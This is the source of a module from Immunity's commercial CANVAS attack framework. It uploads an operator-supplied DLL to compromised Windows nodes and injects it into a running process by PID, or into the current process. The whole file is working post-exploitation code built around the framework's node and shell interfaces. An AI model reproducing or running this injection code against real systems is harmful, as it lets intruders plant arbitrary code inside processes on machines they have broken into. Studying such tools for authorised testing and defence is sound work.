#! /usr/bin/env python



#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
import canvasengine
import time
from canvasexploit import canvasexploit

NAME="injectdll"
DESCRIPTION="Upload a DLL and inject into a running process."
DOCUMENTATION={}
VERSION="1.0"

affectsList=["Commands"]

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result      = ""
        self.name        = NAME
        self.pid         = 0
        self.srcfile     = None
        self.remote_file = None
        
        return

    def getArgs( self ):
        self.pid     = self.argsDict.get("pid", self.pid)
        self.srcfile = self.argsDict.get("srcfile", self.srcfile)
      
    def upload_dll( self, node ):
        
        if "\\" in self.srcfile:
            filename = self.srcfile.split("\\")[::-1][0]
        else:
            filename = self.srcfile.split("/")[::-1][0]
        
        self.remote_file  = "%s\\%s" % ( node.shell.getcwd(), filename )

        ret = 0
        
        try:
            node.upload( self.srcfile, destfilename = self.remote_file )
            ret = 1
        except NodeCommandError, i:
            e = "Failed to upload on node %s: %s" % (node.getname(), i)
            self.log(e)
            self.setInfo("%s - Done (failed on upload)" % NAME)
            ret = -1
            
        return ret
            
    def inject_dll( self, node ):
        """ 
        Just a straight-up DLL injection. No magic here.
        """
        
        if self.pid == 0 or self.pid == "":
            self.log("No PID specified, using current process as injection target.")
            self.pid = node.shell.GetCurrentProcess()
            ret = node.shell.loadlibrarya( self.remote_file )
        else:
            self.pid = int(self.pid)
            ret = node.shell.injectdll( self.pid, self.remote_file )
            
        
        
        if ret > 0:
            self.log("DLL injected and loaded using thread ID: 0x%08x" % ret)
            self.setInfo("%s - done (Success!)" % NAME )
        else:
            self.log("Failed to inject DLL on remote host. Unknown error.")
            self.setInfo("%s - done (failed)" % NAME)
            
        return ret
        
    def run(self):
        self.setInfo("%s (in progress)"%(NAME))
        self.getArgs()
        node=self.argsDict["passednodes"][0]

        if self.srcfile is None:
            self.log("Please enter a source DLL to upload and inject.")
            self.setInfo("%s - done (failed)" % NAME )
            return 0
        
        self.result=[]
        for node in self.argsDict["passednodes"]:
            nodetype=node.nodetype
            capabilities=node.capabilities
            
            if "win32api" in capabilities:
                
                # Upload the DLL first
                ret = self.upload_dll( node )
                
                if ret != -1:
                    ret = self.inject_dll( node )
                    self.result += [ret]
               
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result+=[0]
                
        if 1 in self.result:
            ret=1
        else:
            ret=0
        self.dispshellcmd = self.command
        self.setInfo("%s - done"%(NAME))
        return ret

